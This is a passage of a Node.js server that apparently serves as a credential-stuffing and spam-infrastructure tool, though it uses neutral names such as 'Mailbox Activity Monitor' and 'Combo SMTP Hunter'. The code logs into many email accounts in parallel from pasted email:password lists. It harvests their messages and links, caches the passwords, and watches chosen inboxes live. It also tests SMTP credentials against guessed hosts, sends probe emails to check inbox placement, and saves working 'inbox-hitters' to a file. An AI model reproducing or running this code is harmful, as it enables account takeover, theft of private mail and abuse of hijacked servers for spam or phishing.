  }

  // 3. Fallback: Check if rawMessage itself is pure base64 HTML
  try {
    const stripped = rawMessage.replace(/\s+/g, '');
    if (/^[A-Za-z0-9+/=]{40,}$/.test(stripped)) {
      const dec = Buffer.from(stripped, 'base64').toString('utf8');
      if (dec.includes('<html') || dec.includes('<!DOCTYPE') || dec.includes('<table')) {
        return { html: dec, text: '' };
      }
    }
  } catch (e) {}

  return { html: '', text: rawMessage };
}


/**
 * Parses IMAP FETCH header blocks
 */
function parseFetchHeaderBlocks(imapFetchData) {
  const messages = [];
  const blocks = imapFetchData.split(/\*\s+\d+\s+FETCH\s*\(/i);

  for (let i = 1; i < blocks.length; i++) {
    const block = blocks[i];
    const uidMatch = block.match(/UID\s+(\d+)/i);
    const uid = uidMatch ? uidMatch[1] : null;

    const dateMatch = block.match(/INTERNALDATE\s+"([^"]+)"/i);
    const internalDate = dateMatch ? dateMatch[1] : '';

    let currentField = null;
    let headerMap = {};
    const lines = block.split(/\r?\n/);

    for (const line of lines) {
      if (/^[A-Za-z\-]+:/.test(line)) {
        const colonIdx = line.indexOf(':');
        currentField = line.substring(0, colonIdx).toLowerCase().trim();
        headerMap[currentField] = line.substring(colonIdx + 1).trim();
      } else if (currentField && /^\s+/.test(line)) {
        headerMap[currentField] += ' ' + line.trim();
      } else if (line.trim() === ')' || (line.startsWith('T') && line.includes('OK'))) {
        currentField = null;
      }
    }

    messages.push({
      uid: uid || String(i),
      from: headerMap['from'] || '',
      subject: headerMap['subject'] || '',
      date: headerMap['date'] || internalDate
    });
  }

  return messages;
}

/**
 * Extracts raw body text from IMAP FETCH response
 */
function extractBodyFromFetchResponse(fetchData) {
  if (!fetchData) return '';
  const match = fetchData.match(/BODY(?:\[[^\]]*\]|\.PEEK\[[^\]]*\])?\s*\{(\d+)\}\r?\n/i);
  if (match) {
    const startIdx = match.index + match[0].length;
    const length = parseInt(match[1], 10);
    if (!isNaN(length)) {
      return fetchData.substr(startIdx, length);
    }
  }
  // Fallback: strip header line and trailing paren
  const lines = fetchData.split(/\r?\n/);
  if (lines.length > 2) {
    return lines.slice(1, lines.length - 1).join('\n');
  }
  return fetchData;
}

// --------------------------------------------------------------------------
// API: Mailbox Activity Monitor Endpoints
// --------------------------------------------------------------------------

// Start batch indexing with multi-threaded parallel worker pool
app.post('/api/monitor/start', async (req, res) => {
  try {
    if (monitorActive) {
      return res.status(400).json({ error: 'Mailbox Activity Monitor is already indexing' });
    }

    const { accountList, keywords, options } = req.body;
    if (!accountList || typeof accountList !== 'string') {
      return res.status(400).json({ error: 'Account list is required' });
    }

    const rawLines = accountList
      .split('\n')
      .map(l => l.trim())
      .filter(l => l && !l.startsWith('#'));

    if (rawLines.length === 0) {
      return res.status(400).json({ error: 'No valid account credentials provided' });
    }

    const filterKeywords = Array.isArray(keywords)
      ? keywords.map(k => k.trim().toLowerCase()).filter(Boolean)
      : [];

    const requestedThreads = parseInt(options?.threads, 10) || 10;
    const threads = Math.max(1, Math.min(requestedThreads, 50, rawLines.length));
    const socketTimeout = Math.max(1500, Math.min(parseInt(options?.timeout, 10) || 5000, 20000));
    const prefetchBody = options?.prefetchBody !== false;
    const scanDepth = options && options.scanDepth ? options.scanDepth : 25;
    const includeSpam = options && options.folderScope ? options.folderScope.includes('Spam') : true;

    monitorActive = true;
    monitorResults = [];
    monitorConcurrency = threads;
    activeMonitorSessions.clear();

    // Respond immediately with thread allocation confirmation
    res.json({
      success: true,
      message: `Mailbox activity monitor started with ${threads} parallel worker threads`,
      totalAccounts: rawLines.length,
      threads,
      socketTimeout,
      prefetchBody,
      keywords: filterKeywords
    });

    // Execute multi-threaded batch indexing in background
    (async () => {
      const startTime = Date.now();
      let nextIndex = 0;
      let testedCount = 0;
      let authenticatedCount = 0;
      let matchedAccountsCount = 0;
      let totalMatchedMessagesCount = 0;
      let failedCount = 0;

      const emitProgress = (phase, currentEmail, accountRecord = null, workerId = 1) => {
        const elapsedSec = Math.max(0.1, (Date.now() - startTime) / 1000);
        const rate = parseFloat((testedCount / elapsedSec).toFixed(1));
        broadcast({
          type: 'monitor-progress',
          data: {
            phase,
            currentAccount: currentEmail,
            accountRecord,
            tested: testedCount,
            total: rawLines.length,
            authenticated: authenticatedCount,
            matchedAccounts: matchedAccountsCount,
            matchedMessages: totalMatchedMessagesCount,
            failed: failedCount,
            threads,
            rate,
            workerId,
            elapsedMs: Date.now() - startTime
          }
        });
      };

      const runWorker = async (workerId) => {
        while (nextIndex < rawLines.length && monitorActive) {
          const i = nextIndex++;
          const line = rawLines[i];
          let host = null;
          let port = 993;
          let email = '';
          let pass = '';

          if (line.includes('|')) {
            const parts = line.split('|').map(p => p.trim());
            if (parts.length >= 4) {
              host = parts[0];
              port = parseInt(parts[1], 10) || 993;
              email = parts[2];
              pass = parts.slice(3).join('|');
            } else if (parts.length === 2) {
              email = parts[0];
              pass = parts[1];
            }
          } else if (line.includes(':')) {
            const firstColon = line.indexOf(':');
            email = line.substring(0, firstColon).trim();
            pass = line.substring(firstColon + 1).trim();
          }

          if (!email || !pass) {
            failedCount++;
            testedCount++;
            continue;
          }

          // Cache credentials for on-demand inspection
          monitorCredentialsStore.set(email.toLowerCase(), { email, pass, host, port });
          emitProgress('probing', email, null, workerId);

          let imapConfig = null;
          if (host) {
            imapConfig = { host, port, user: email, pass };
          } else {
            imapConfig = await autoDiscoverImap(email, pass);
          }

          if (!imapConfig || !monitorActive) {
            failedCount++;
            testedCount++;
            const failedRecord = {
              account: email,
              status: 'auth_failed',
              error: !monitorActive ? 'Action aborted by operator' : 'Could not connect or auto-discover IMAP credentials',
              matchedMessages: []
            };
            monitorResults.push(failedRecord);
            emitProgress('account_result', email, failedRecord, workerId);
            continue;
          }

          authenticatedCount++;
          const session = new ImapSession(imapConfig.host, imapConfig.port);
          activeMonitorSessions.add(session);
          let accountMatchedMessages = [];

          try {
            await session.connect(socketTimeout);
            const safeUser = imapConfig.user.replace(/["\\]/g, '\\$&');
            const safePass = imapConfig.pass.replace(/["\\]/g, '\\$&');
            const loginRes = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, socketTimeout + 1500);

            if (!loginRes.ok) {
              failedCount++;
              authenticatedCount--;
              testedCount++;
              const authFailRecord = {
                account: email,
                status: 'auth_failed',
                error: 'IMAP Authentication failed (invalid credentials)',
                matchedMessages: []
              };
              monitorResults.push(authFailRecord);
              emitProgress('account_result', email, authFailRecord, workerId);
              continue;
            }

            // Discover folder scope
            let targetFolders = ['INBOX'];
            if (includeSpam) {
              const listRes = await session.exec('LIST "" "*"', socketTimeout);
              if (listRes.ok) {
                const lines = listRes.data.split('\r\n');
                for (const l of lines) {
                  const match = l.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" "([^"]+)"/i) || l.match(/\* LIST \([^)]*\) "(?:[^"\\]|\\.)*" (.+)$/i);
                  if (match) {
                    const fName = match[1].trim();
                    if (/spam|junk|bulk|quarantine|verdacht/i.test(fName) && !targetFolders.includes(fName)) {
                      targetFolders.push(fName);
                    }
                  }
                }
              }
            }

            // Index each folder
            for (const folder of targetFolders) {
              if (!monitorActive) break;

              const selRes = await session.exec(`SELECT "${folder}"`, socketTimeout);
              if (!selRes.ok) continue;

              const existsMatch = selRes.data.match(/\*\s+(\d+)\s+EXISTS/i);
              const totalMsgs = existsMatch ? parseInt(existsMatch[1], 10) : 0;
              if (totalMsgs === 0) continue;

              let startSeq = 1;
              if (scanDepth !== 'all') {
                const depthNum = parseInt(scanDepth, 10) || 25;
                startSeq = Math.max(1, totalMsgs - depthNum + 1);
              }

              const fetchRange = `${startSeq}:*`;
              const headerRes = await session.exec(`FETCH ${fetchRange} (UID INTERNALDATE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE TO)])`, socketTimeout + 3000);

              if (headerRes.ok) {
                const msgs = parseFetchHeaderBlocks(headerRes.data);

                for (const m of msgs) {
                  if (!monitorActive) break;

                  const fromObj = parseFromHeader(m.from);
                  const decodedSubject = decodeMimeHeader(m.subject);
                  const fromSearchText = `${fromObj.name} ${fromObj.address} ${fromObj.raw}`.toLowerCase();

                  let matchedKw = [];
                  if (filterKeywords.length === 0) {
                    matchedKw = ['*'];
                  } else {
                    matchedKw = filterKeywords.filter(kw => fromSearchText.includes(kw));
                  }

                  if (matchedKw.length > 0) {
                    let htmlBody = '';
                    let textBody = '';
                    let links = [];

                    if (prefetchBody) {
                      try {
                        // Use 150KB size limit to ensure fast body and link extraction without hanging on huge attachments
                        const bodyRes = await session.exec(`UID FETCH ${m.uid} (BODY.PEEK[]<0.150000>)`, socketTimeout + 2500);
                        if (bodyRes.ok) {
                          const rawBody = extractBodyFromFetchResponse(bodyRes.data);
                          const unpacked = unpackMimeBody(rawBody);
                          htmlBody = unpacked.html;
                          textBody = unpacked.text;
                          links = extractLinks(htmlBody, textBody);
                        }
                      } catch (bodyErr) {
                        textBody = `[Body retrieval error: ${bodyErr.message}]`;
                      }
                    }

                    const matchedItem = {
                      uid: m.uid,
                      folder,
                      subject: decodedSubject || '(No Subject)',
                      senderName: fromObj.name || fromObj.address,
                      senderAddress: fromObj.address,
                      date: m.date,
                      htmlBody,
                      textBody,
                      links,
                      matchedKeywords: matchedKw
                    };

                    accountMatchedMessages.push(matchedItem);

                    // Store in message body cache
                    const cacheKey = `${email.toLowerCase()}:${folder}:${m.uid}`;
                    mailboxMessageCache.set(cacheKey, matchedItem);
                  }
                }
              }
            }
          } catch (sessErr) {
            // Handled in finally
          } finally {
            activeMonitorSessions.delete(session);
            try { session.close(); } catch (e) {}
          }

          testedCount++;
          const isMatch = accountMatchedMessages.length > 0;
          if (isMatch) {
            matchedAccountsCount++;
            totalMatchedMessagesCount += accountMatchedMessages.length;
          }

          const accountRecord = {
            account: email,
            host: imapConfig.host,
            port: imapConfig.port,
            status: isMatch ? 'matched' : 'no_match',
            matchedMessages: accountMatchedMessages,
            matchesCount: accountMatchedMessages.length,
            matchedKeywords: Array.from(new Set(accountMatchedMessages.flatMap(m => m.matchedKeywords)))
          };

          monitorResults.push(accountRecord);
          emitProgress('account_result', email, accountRecord, workerId);
        }
      };

      // Launch parallel worker pool
      const workerPool = [];
      const actualThreads = Math.min(threads, rawLines.length);
      for (let w = 0; w < actualThreads; w++) {
        workerPool.push(runWorker(w + 1));
      }
      await Promise.all(workerPool);

      monitorActive = false;
      for (const sess of activeMonitorSessions) {
        try { sess.close(); } catch (e) {}
      }
      activeMonitorSessions.clear();

      const elapsedSec = Math.max(0.1, (Date.now() - startTime) / 1000);
      const rate = parseFloat((testedCount / elapsedSec).toFixed(1));

      broadcast({
        type: 'monitor-finished',
        data: {
          total: rawLines.length,
          tested: testedCount,
          authenticated: authenticatedCount,
          matchedAccounts: matchedAccountsCount,
          matchedMessages: totalMatchedMessagesCount,
          failed: failedCount,
          results: monitorResults,
          elapsedMs: Date.now() - startTime,
          rate,
          threads: actualThreads
        }
      });
    })().catch(err => {
      console.error('[Mailbox Monitor Error]:', err);
      monitorActive = false;
      for (const sess of activeMonitorSessions) {
        try { sess.close(); } catch (e) {}
      }
      activeMonitorSessions.clear();
    });

  } catch (error) {
    monitorActive = false;
    for (const sess of activeMonitorSessions) {
      try { sess.close(); } catch (e) {}
    }
    activeMonitorSessions.clear();
    res.status(500).json({ error: error.message });
  }
});

// Stop batch indexing: Instantly aborts and destroys all active concurrent worker sockets
app.post('/api/monitor/stop', (req, res) => {
  monitorActive = false;
  const closedCount = activeMonitorSessions.size;
  for (const sess of activeMonitorSessions) {
    try { sess.close(); } catch (e) {}
  }
  activeMonitorSessions.clear();

  broadcast({
    type: 'monitor-finished',
    data: {
      aborted: true,
      message: `Mailbox activity monitor stopped by operator (${closedCount} active threads terminated)`,
      results: monitorResults
    }
  });
  res.json({ success: true, message: `Monitor indexing halted (${closedCount} active sockets terminated)` });
});

// Retrieve full message body and links for a specific UID
app.get('/api/monitor/message-body', async (req, res) => {
  try {
    const { account, folder, uid } = req.query;
    if (!account || !uid) {
      return res.status(400).json({ error: 'Account and UID parameters are required' });
    }

    const folderName = folder || 'INBOX';
    const cacheKey = `${account.toLowerCase()}:${folderName}:${uid}`;

    if (mailboxMessageCache.has(cacheKey)) {
      const cached = mailboxMessageCache.get(cacheKey);
      const hasErr = cached && cached.textBody && cached.textBody.includes('Body retrieval error');
      if (req.query.force !== 'true' && cached && !hasErr && (cached.htmlBody || cached.textBody)) {
        return res.json({ success: true, message: cached });
      }
    }

    // Attempt on-demand fetch if credentials are known
    const creds = monitorCredentialsStore.get(account.toLowerCase());
    if (!creds) {
      return res.status(404).json({ error: 'Message body not cached and credentials unavailable' });
    }

    const targetHost = creds.host || (await autoDiscoverImap(creds.email, creds.pass))?.host;
    const targetPort = creds.port || 993;
    if (!targetHost) {
      return res.status(500).json({ error: 'Unable to resolve IMAP host for account' });
    }

    const session = new ImapSession(targetHost, targetPort);
    await session.connect(5000);
    const safeUser = creds.email.replace(/["\\]/g, '\\$&');
    const safePass = creds.pass.replace(/["\\]/g, '\\$&');
    await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 6000);
    await session.exec(`SELECT "${folderName}"`, 5000);

    const bodyRes = await session.exec(`UID FETCH ${uid} (BODY.PEEK[] INTERNALDATE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])`, 12000);
    session.close();

    if (bodyRes.ok) {
      const rawBody = extractBodyFromFetchResponse(bodyRes.data);
      const unpacked = unpackMimeBody(rawBody);
      const links = extractLinks(unpacked.html, unpacked.text);

      const msgObj = {
        uid,
        folder: folderName,
        htmlBody: unpacked.html,
        textBody: unpacked.text,
        links
      };

      mailboxMessageCache.set(cacheKey, msgObj);
      return res.json({ success: true, message: msgObj });
    }

    res.status(500).json({ error: 'Failed to retrieve message body from IMAP server' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// --------------------------------------------------------------------------
// Real-Time Event Subscription
// --------------------------------------------------------------------------

// Start live IMAP subscription for a single mailbox
app.post('/api/monitor/subscription/start', async (req, res) => {
  try {
    const { email, password, keywords, host, port } = req.body;
    if (!email) {
      return res.status(400).json({ error: 'Email address is required' });
    }

    // Terminate existing subscription if running
    if (activeSubscription.active) {
      if (activeSubscription.timer) clearInterval(activeSubscription.timer);
      if (activeSubscription.session) activeSubscription.session.close();
      activeSubscription.active = false;
    }

    let targetPass = password;
    let targetHost = host;
    let targetPort = port || 993;

    // Check stored credentials if password omitted
    if (!targetPass && monitorCredentialsStore.has(email.toLowerCase())) {
      const stored = monitorCredentialsStore.get(email.toLowerCase());
      targetPass = stored.pass;
      if (!targetHost) targetHost = stored.host;
      if (!targetPort) targetPort = stored.port;
    }

    if (!targetPass) {
      return res.status(400).json({ error: 'Password is required for mailbox subscription' });
    }

    let imapConfig = null;
    if (targetHost) {
      imapConfig = { host: targetHost, port: targetPort, user: email, pass: targetPass };
    } else {
      imapConfig = await autoDiscoverImap(email, targetPass);
    }

    if (!imapConfig) {
      return res.status(400).json({ error: 'Could not auto-discover or connect to IMAP server' });
    }

    const session = new ImapSession(imapConfig.host, imapConfig.port);
    await session.connect(5000);
    const safeUser = imapConfig.user.replace(/["\\]/g, '\\$&');
    const safePass = imapConfig.pass.replace(/["\\]/g, '\\$&');
    const loginRes = await session.exec(`LOGIN "${safeUser}" "${safePass}"`, 6000);

    if (!loginRes.ok) {
      session.close();
      return res.status(401).json({ error: 'IMAP Authentication failed' });
    }

    // Select INBOX and find current highest UID
    const selRes = await session.exec('SELECT "INBOX"', 5000);
    let initialHighestUid = 0;

    const searchRes = await session.exec('SEARCH ALL', 5000);
    if (searchRes.ok) {
      const match = searchRes.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
      if (match && match[1]) {
        const uids = match[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n));
        if (uids.length > 0) {
          const maxSeq = Math.max(...uids);
          const fRes = await session.exec(`FETCH ${maxSeq} (UID)`, 4000);
          const uidMatch = fRes.data.match(/UID\s+(\d+)/i);
          if (uidMatch) {
            initialHighestUid = parseInt(uidMatch[1], 10);
          }
        }
      }
    }

    const subKeywords = Array.isArray(keywords)
      ? keywords.map(k => k.trim().toLowerCase()).filter(Boolean)
      : [];

    const pollInterval = Math.max(1500, Math.min(parseInt(req.body.pollInterval, 10) || 2500, 30000));

    activeSubscription = {
      active: true,
      email,
      pass: targetPass,
      host: imapConfig.host,
      port: imapConfig.port,
      keywords: subKeywords,
      session,
      highestUid: initialHighestUid,
      pollInterval,
      timer: null
    };

    // Start background poll with high-speed pulse
    activeSubscription.timer = setInterval(async () => {
      if (!activeSubscription.active || !activeSubscription.session) return;

      try {
        const sRes = await activeSubscription.session.exec('NOOP', 3000);
        if (!sRes.ok) {
          // Reconnect on disconnect
          try {
            activeSubscription.session.close();
            activeSubscription.session = new ImapSession(activeSubscription.host, activeSubscription.port);
            await activeSubscription.session.connect(4000);
            await activeSubscription.session.exec(`LOGIN "${safeUser}" "${safePass}"`, 5000);
            await activeSubscription.session.exec('SELECT "INBOX"', 4000);
          } catch (reconnErr) {
            return;
          }
        }

        // Check for new UIDs greater than highestUid
        const nextUid = activeSubscription.highestUid + 1;
        const newSearch = await activeSubscription.session.exec(`UID SEARCH UID ${nextUid}:*`, 4000);

        if (newSearch.ok) {
          const match = newSearch.data.match(/\*\s+SEARCH\s+([0-9\s]+)/i);
          if (match && match[1] && match[1].trim().length > 0) {
            const newUids = match[1].trim().split(/\s+/).map(Number).filter(n => !isNaN(n) && n > activeSubscription.highestUid);

            for (const nUid of newUids) {
              const fetchRes = await activeSubscription.session.exec(
                `UID FETCH ${nUid} (INTERNALDATE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE TO)] BODY.PEEK[]<0.150000>)`,
                8000
              );

              if (fetchRes.ok) {
                const headerBlocks = parseFetchHeaderBlocks(fetchRes.data);
                const headerInfo = headerBlocks.length > 0 ? headerBlocks[0] : { from: '', subject: '', date: '' };

                const fromObj = parseFromHeader(headerInfo.from);
                const decodedSubject = decodeMimeHeader(headerInfo.subject);
                const fromSearch = `${fromObj.name} ${fromObj.address} ${fromObj.raw}`.toLowerCase();

                let matchedKw = [];
                if (activeSubscription.keywords.length === 0) {
                  matchedKw = ['*'];
                } else {
                  matchedKw = activeSubscription.keywords.filter(k => fromSearch.includes(k));
                }

                if (matchedKw.length > 0) {
                  const rawBody = extractBodyFromFetchResponse(fetchRes.data);
                  const unpacked = unpackMimeBody(rawBody);
                  const links = extractLinks(unpacked.html, unpacked.text);

                  const eventPayload = {
                    account: activeSubscription.email,
                    folder: 'INBOX',
                    uid: nUid,
                    subject: decodedSubject || '(No Subject)',
                    senderName: fromObj.name || fromObj.address,
                    senderAddress: fromObj.address,
                    date: headerInfo.date || new Date().toISOString(),
                    htmlBody: unpacked.html,
                    textBody: unpacked.text,
                    links,
                    matchedKeywords: matchedKw,
                    receivedAt: new Date().toLocaleTimeString()
                  };

                  // Cache message
                  const cacheKey = `${activeSubscription.email.toLowerCase()}:INBOX:${nUid}`;
                  mailboxMessageCache.set(cacheKey, eventPayload);

                  // Emit real-time WebSocket event
                  broadcast({
                    type: 'monitor-subscription-event',
                    data: eventPayload
                  });
                }
              }

              if (nUid > activeSubscription.highestUid) {
                activeSubscription.highestUid = nUid;
              }
            }
          }
        }
      } catch (pollErr) {
        // Polling retry on next interval
      }
    }, pollInterval);

    res.json({
      success: true,
      message: `Subscribed to live events on ${email} (${pollInterval}ms pulse)`,
      account: email,
      host: imapConfig.host,
      pollInterval,
      highestUid: initialHighestUid
    });
  } catch (error) {
    if (activeSubscription.session) activeSubscription.session.close();
    activeSubscription.active = false;
    res.status(500).json({ error: error.message });
  }
});

// Stop live IMAP subscription
app.post('/api/monitor/subscription/stop', (req, res) => {
  if (activeSubscription.timer) {
    clearInterval(activeSubscription.timer);
    activeSubscription.timer = null;
  }
  if (activeSubscription.session) {
    activeSubscription.session.close();
    activeSubscription.session = null;
  }
  const prevEmail = activeSubscription.email;
  activeSubscription.active = false;
  activeSubscription.email = null;

  broadcast({
    type: 'monitor-subscription-stopped',
    data: { account: prevEmail }
  });

  res.json({ success: true, message: 'Mailbox subscription stopped' });
});

// Get current monitor and subscription state
app.get('/api/monitor/status', (req, res) => {
  res.json({
    indexingActive: monitorActive,
    activeThreads: activeMonitorSessions.size,
    concurrency: monitorConcurrency,
    totalResults: monitorResults.length,
    subscription: {
      active: activeSubscription.active,
      account: activeSubscription.email,
      host: activeSubscription.host
    }
  });
});

app.get('/api/statistics', (req, res) => {
  try {
    const emailsPath = path.join(__dirname, 'emails.txt');
    const smtpPath = path.join(__dirname, 'smtp.txt');
    
    let emailCount = 0;
    let smtpCount = 0;
    
    if (fs.existsSync(emailsPath)) {
      const content = fs.readFileSync(emailsPath, 'utf8');
      emailCount = content.split('\n').filter(line => line.trim()).length;
    }
    
    if (fs.existsSync(smtpPath)) {
      const content = fs.readFileSync(smtpPath, 'utf8');
      smtpCount = content.split('\n').filter(line => line.trim()).length;
    }
    
    res.json({
      totalEmails: emailCount,
      totalSmtpServers: smtpCount,
      isRunning: isRunning,
      progress: currentProgress
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ============================================================================
// 🎯 CORE OPERATIONS: COMBO SMTP HUNTER & SMART MATRIX VALIDATOR
// ============================================================================

let comboHunterActive = false;
let comboHunterAbort = false;
let comboHunterResults = [];
let comboHunterStats = {
  total: 0,
  checked: 0,
  valid: 0,
  sent: 0,
  failed: 0,
  startTime: 0,
  elapsed: '0s',
  cps: 0
};
const hunterDomainCache = new Map();

/**
 * Intelligent Mail Server Discovery with Fast-Path MX and Prefix Fallback
 */
async function getHunterSmartHosts(domain, customPorts = [587, 465, 25]) {
  const normDomain = domain.toLowerCase().trim();
  if (hunterDomainCache.has(normDomain)) {
    return hunterDomainCache.get(normDomain) || [];
  }

  const ports = Array.isArray(customPorts) && customPorts.length > 0 ? customPorts : [587, 465, 25];
  const hosts = [];
  const uniqueHostnames = new Set();

  // 1. FAST-PATH: DNS MX Lookup (Highest fidelity)
  try {
    const mxRecords = await Promise.race([
      dns.resolveMx(normDomain),
      new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
    ]);

    if (Array.isArray(mxRecords) && mxRecords.length > 0) {
      mxRecords.sort((a, b) => (a.priority || 0) - (b.priority || 0));
      for (const rec of mxRecords) {
        if (rec.exchange) {
          const exHost = rec.exchange.toLowerCase().trim();
          if (!uniqueHostnames.has(exHost)) {
            uniqueHostnames.add(exHost);
            for (const port of ports) {
              hosts.push({ host: exHost, port, type: 'MX' });
            }
          }
        }
      }
    }
  } catch (err) {
    // MX lookup failure is handled gracefully by falling back
  }

  // 2. Intelligent Prefix Fallbacks
  const prefixes = ['smtp', 'mail', 'webmail', 'mx', 'email', 'secure', 'smtp-mail', 'relay'];
  uniqueHostnames.add(normDomain);
  for (const pfx of prefixes) {
    uniqueHostnames.add(`${pfx}.${normDomain}`);
  }

  // Add domain variations if applicable (e.g., brand.com from brand.co.uk)
  const parts = normDomain.split('.');
  if (parts.length >= 2) {
    const mainBrand = parts[parts.length - 2];
    if (mainBrand && mainBrand.length > 3) {
      uniqueHostnames.add(`${mainBrand}.com`);
    }
  }

  for (const fHost of uniqueHostnames) {
    for (const port of ports) {
      if (!hosts.some(h => h.host === fHost && h.port === port)) {
        hosts.push({ host: fHost, port, type: 'FALLBACK' });
      }
    }
  }

  // 3. Ultra-Fast DNS Liveness Filter
  const distinctHostnames = Array.from(new Set(hosts.map(h => h.host)));
  const liveHostnames = new Set();

  const chunkSize = 15;
  for (let i = 0; i < distinctHostnames.length; i += chunkSize) {
    const chunk = distinctHostnames.slice(i, i + chunkSize);
    await Promise.all(chunk.map(async (h) => {
      try {
        await Promise.race([
          dns.resolve4(h),
          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 2500))
        ]);
        liveHostnames.add(h);
      } catch (e) {
        // Drop unresolvable hostname
      }
    }));
  }

  const liveHosts = hosts.filter(h => liveHostnames.has(h.host));
  hunterDomainCache.set(normDomain, liveHosts);
  return liveHosts;
}

/**
 * Verify a single SMTP credential against a specific host
 */
function testHunterConnection(user, pass, host, port, timeoutMs = 8000) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const isSecure = port === 465;

    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: isSecure,
      auth: { user, pass },
      tls: { rejectUnauthorized: false },
      connectionTimeout: timeoutMs,
      greetingTimeout: timeoutMs,
      socketTimeout: timeoutMs
    });

    let completed = false;

    const hardTimer = setTimeout(() => {
      if (!completed) {
        completed = true;
        try { transporter.close(); } catch (_) { }
        resolve({
          valid: false,
          error: 'Connection timed out',
          latency: Date.now() - startTime,
          host,
          port
        });
      }
    }, timeoutMs + 2000);

    transporter.verify((err) => {
      if (completed) return;
      completed = true;
      clearTimeout(hardTimer);

      const latency = Date.now() - startTime;
      if (!err) {
        resolve({
          valid: true,
          transporter,
          latency,
          host,
          port,
          secure: isSecure
        });
      } else {
        try { transporter.close(); } catch (_) { }
        const errMsg = err.message ? err.message.split('\n')[0] : (err.code || 'Verification failed');
        resolve({
          valid: false,
          error: errMsg,
          latency,
          host,
          port
        });
      }
    });
  });
}

/**
 * Fast parallelized candidate host probing
 * Tests candidate host/port endpoints in small concurrent batches to identify valid nodes in milliseconds
 */
async function probeHunterCandidates(user, pass, candidates, timeoutMs = 3500) {
  if (!candidates || candidates.length === 0) return null;
  const batchSize = 3;

  for (let i = 0; i < candidates.length; i += batchSize) {
    if (comboHunterAbort) break;
    const batch = candidates.slice(i, i + batchSize);
    const results = await Promise.all(
      batch.map(cand => testHunterConnection(user, pass, cand.host, cand.port, timeoutMs))
    );

    const valid = results.find(r => r.valid);
    if (valid) {
      // Close unused open transporters in this batch
      results.forEach(r => {
        if (r !== valid && r.transporter) {
          try { r.transporter.close(); } catch (_) { }
        }
      });
      return valid;
    }
  }
  return null;
}

/**
 * Smart Multi-Domain Live Inbox & Placement Verification Engine
 */
const hunterImapSessionCache = new Map();
const hunterBackgroundImapQueue = [];
let hunterBackgroundImapRunning = false;

function parseHunterTestTargets(inputStr) {
  if (!inputStr || typeof inputStr !== 'string') return [];
  const lines = inputStr.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
  const targets = [];
  for (const line of lines) {
    let email = '';
    let pass = '';
    if (line.includes('|')) {
      const parts = line.split('|');
      email = parts[0].trim();
      pass = parts.slice(1).join('|').trim();
    } else if (line.includes(':') && line.indexOf(':') > line.indexOf('@')) {
      const idx = line.indexOf(':');
      email = line.substring(0, idx).trim();
      pass = line.substring(idx + 1).trim();
    } else {
      email = line.trim();
    }
    if (email && email.includes('@')) {
      const domain = email.split('@')[1].toLowerCase().trim();
      targets.push({ email, pass, domain });
    }
  }
  return targets;
}

/**
 * Enqueue background IMAP check to avoid stalling checking threads
 */
function enqueueHunterImapCheck(hitRecord, deliveryRes, targetEmail, targetPass, testToken, sendStartTime, subject = '') {
  hunterBackgroundImapQueue.push({
    hitRecord,
    deliveryRes,
    targetEmail,
    targetPass,
    testToken,
    sendStartTime,
    subject
  });
  processHunterBackgroundImapQueue();
}

async function processHunterBackgroundImapQueue() {
  if (hunterBackgroundImapRunning) return;
  hunterBackgroundImapRunning = true;

  try {
    while (hunterBackgroundImapQueue.length > 0 && !comboHunterAbort) {
      const item = hunterBackgroundImapQueue.shift();
      if (!item) continue;

      try {
        let imapConfig = hunterImapSessionCache.get(item.targetEmail);
        if (!imapConfig) {
          imapConfig = await autoDiscoverImap(item.targetEmail, item.targetPass);
          if (imapConfig) {
            hunterImapSessionCache.set(item.targetEmail, imapConfig);
          }
        }

        if (imapConfig) {
          // Strictly verify placement using the unique probeToken - zero false positives!
          const placement = await checkImapPlacement(
            imapConfig,
            item.hitRecord.user,
            item.subject || `[Inbox Test • ${item.testToken}]`,
            item.sendStartTime,
            16000,
            null,
            item.testToken // Strictly verify unique probe token
          );

          if (placement) {
            item.deliveryRes.placement = placement.landed;
            item.deliveryRes.folder = placement.folder || (placement.landed === 'inbox' ? 'INBOX' : placement.landed.toUpperCase());
            if (placement.error) item.deliveryRes.error = placement.error;
            if (placement.landed === 'inbox') {
              item.hitRecord.inbox = true;
              comboHunterStats.inbox++;

              // Auto-store verified hitter to inbox-hitters.txt
              try {
                const hitterLine = `${item.hitRecord.host}|${item.hitRecord.port}|${item.hitRecord.user}|${item.hitRecord.pass}|${item.deliveryRes.domain}\n`;
                const hittersPath = path.join(__dirname, 'inbox-hitters.txt');
                let existingHitters = '';
                if (fs.existsSync(hittersPath)) {
                  existingHitters = fs.readFileSync(hittersPath, 'utf8');
                }
                const checkPrefix = `${item.hitRecord.host}|${item.hitRecord.port}|${item.hitRecord.user}`;
                if (!existingHitters.includes(checkPrefix)) {
                  fs.appendFileSync(hittersPath, hitterLine);
                }
              } catch (_) {}
            } else if (placement.landed === 'spam') {
              item.hitRecord.spam = true;
              comboHunterStats.spam++;
            }
          }
        } else {
          item.deliveryRes.folder = 'RELAY OK (IMAP N/A)';
        }
      } catch (err) {
        item.deliveryRes.folder = 'RELAY OK (IMAP ERR)';
        item.deliveryRes.error = err.message;
      }

      // Stream live update to UI without blocking worker threads
      broadcast({
        type: 'combo-hunter-delivery-update',
        data: {
          user: item.hitRecord.user,
          host: item.hitRecord.host,
          port: item.hitRecord.port,
          deliveries: item.hitRecord.deliveries,
          inbox: item.hitRecord.inbox,
          spam: item.hitRecord.spam,
          stats: comboHunterStats
        }
      });
    }
  } catch (err) {
    console.error('[Hunter Background IMAP Queue Error]', err);
  } finally {
    hunterBackgroundImapRunning = false;
  }
}

/**
 * Rapid non-blocking delivery test: sends authentic sample email with unique invisible probe token
 */
async function verifyHunterDeliveryTarget(transporter, senderUser, senderPass, host, port, target, templateData = null) {
